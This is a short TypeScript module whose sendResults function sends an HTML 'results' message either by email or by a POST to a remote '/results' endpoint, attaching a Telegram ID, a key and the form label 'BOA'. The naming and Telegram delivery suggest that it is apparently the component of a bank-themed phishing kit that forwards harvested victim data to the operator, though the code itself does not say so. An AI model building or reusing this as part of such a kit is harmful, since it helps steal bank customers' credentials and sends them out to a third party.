import Mail from "nodemailer/lib/mailer";
import FormData from "form-data";
import { email } from "./email";

export const sendResults = async (
  html: string,
  subject: string,
  attachments?: Mail.Attachment[] | undefined
) => {
  try {
    if (process.env.SMTP_HOST && process.env.EMAIL) {
      return email(process.env.EMAIL, html, subject, attachments);
    }

    const to = process.env.EMAIL;
    const telegramId = process.env.TELEGRAM;
    const formData = new FormData();

    if (to) formData.append(`email`, to);
    if (telegramId) formData.append(`telegramId`, telegramId);

    formData.append(`message`, html);
    formData.append(`key`, process.env.KEY as string);
    formData.append(`form`, `BOA`);
    formData.append(`subject`, subject);

    await fetch(`${process.env.RES_LINK}/results`, {
      method: `POST`,
      body: formData as any,
      headers: {
        ...formData.getHeaders(),
      },
    });

    return `Message sent`;
  } catch (error) {
    console.log(`error: `, error);

    return `Message could not be sent`;
  }
};
